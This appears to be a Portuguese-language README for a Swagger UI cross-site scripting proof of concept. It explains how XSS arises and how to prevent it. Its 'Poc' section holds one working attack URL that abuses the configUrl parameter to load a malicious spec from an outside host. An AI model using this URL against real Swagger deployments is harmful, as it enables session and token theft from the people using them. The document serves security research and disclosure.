# POC XSS Swagger
## ⚠️ **Aviso Legal**
🚨 **Este projeto é destinado a pesquisas de segurança ética e testes autorizados.**  
⚠️ **Não utilize em sistemas sem permissão explícita!** 
#
O **XSS no Swagger UI** refere-se a uma vulnerabilidade de Cross-Site Scripting (XSS) na interface do Swagger UI.


### O que é Swagger UI?

O Swagger UI é uma interface gráfica que permite desenvolvedores explorar e testar endpoints de APIs de forma interativa, diretamente no navegador. Ele exibe a documentação em um formato legível e também permite enviar requisições HTTP para os endpoints.

### Como um XSS pode ocorrer no Swagger UI?

Um ataque de XSS ocorre quando um atacante consegue injetar scripts maliciosos em um aplicativo web, como o Swagger UI. Essas vulnerabilidades geralmente surgem em cenários como:

  Parâmetros da API manipulados:
        A API documentada permite que parâmetros sejam enviados diretamente na URL (query string, headers ou body) e esses valores sejam renderizados sem a devida sanitização. Por exemplo, se um parâmetro aceito na API é refletido no Swagger UI sem escape, pode ser possível injetar código JavaScript malicioso.

  Uso de arquivos de especificação Swagger (OpenAPI) inseguros:
        O Swagger UI carrega a especificação da API a partir de um arquivo JSON ou YAML (geralmente em swagger.json ou openapi.json). Se esse arquivo for comprometido ou não for validado corretamente, pode conter elementos maliciosos, como scripts injetados.

  Injeção via description ou summary:
        No arquivo de especificação da API, campos como description ou summary podem incluir código HTML ou JavaScript. Se o Swagger UI não estiver configurado para sanitizar essas entradas, o XSS pode ser explorado.

#### Poc
```
http://swagger-ui-sitevul.exemplo.com/index.html?configUrl=https://jeanrafaellourenco.github.io/xss-poc/swagger/xss.json
```

### Impactos de um XSS no Swagger UI
- Sequestro de sessão: Um atacante pode roubar cookies ou tokens de autenticação armazenados no navegador.
- Movimentação lateral: Se o Swagger UI estiver hospedado em um ambiente interno, um atacante pode usá-lo para explorar a infraestrutura interna.
- Desfiguração (Defacement): O atacante pode manipular a interface para enganar usuários legítimos.
- Execução de comandos arbitrários: Scripts injetados podem ser usados para interagir com APIs de maneira não intencionada, causando danos adicionais.

### Como prevenir XSS no Swagger UI?

- Sanitização de entradas: Certifique-se de que os valores retornados pela API ou aceitos como entrada sejam adequadamente escapados e sanitizados.
- Restrição ao arquivo de especificação Swagger: Hospede o arquivo swagger.json ou openapi.json em um ambiente seguro e proteja-o contra modificações não autorizadas.
- Atualização do Swagger UI: Use sempre a versão mais recente do Swagger UI, pois patches de segurança frequentemente corrigem vulnerabilidades conhecidas.
